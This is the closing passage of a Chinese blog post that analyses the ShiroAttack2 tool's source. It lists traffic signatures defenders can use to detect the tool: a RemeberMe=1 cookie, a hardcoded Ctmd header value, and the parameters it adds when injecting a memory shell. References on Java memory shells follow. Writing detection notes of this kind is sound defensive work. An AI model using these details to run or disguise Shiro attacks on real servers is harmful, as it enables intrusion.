class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    通过学习师傅写的工具，对很多技术的实现细节有了一些了解，确实也学到了很多。最后总结部分我想简单聊一下这个工具的利用特征。</p>
<ul>
<li>·在验证key或者爆破key前，会发送RemeberMe=1，如果检测到Cookie中包含<code>RemeberMe=1</code>直接将请求断开，会导致这个工具无法检测密钥，后续的功能也将无法用。</li>
<li>利用链爆破部分会发送<code>Ctmd:08fb41620aa4c498a1f2ef09bbc1183c</code>作为是否可以回显的标志，这一部分是硬编码的，所以如果检测到包含<code>Ctmd:08fb41620aa4c498a1f2ef09bbc1183c</code>，也是有人正在利用该工具检测shiro</li>
<li>内存马注入时，会在请求中加上<code>p</code>和<code>path</code>参数，并且会在post请求中加上<code>dy</code>参数。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a target="_blank" rel="noopener" href="https://github.com/SummerSec/ShiroAttack2">ShiroAttack2</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914#toc-6">Java内存马：一种Tomcat全版本获取StandardContext的新方法</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/fnmsd/article/details/106890242?spm=1001.2014.3001.5501">Java中间件通用回显方法的问题及处理(7.7更新)</a></p>
</li>
</ul>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/源码分析/">源码分析</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2022 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>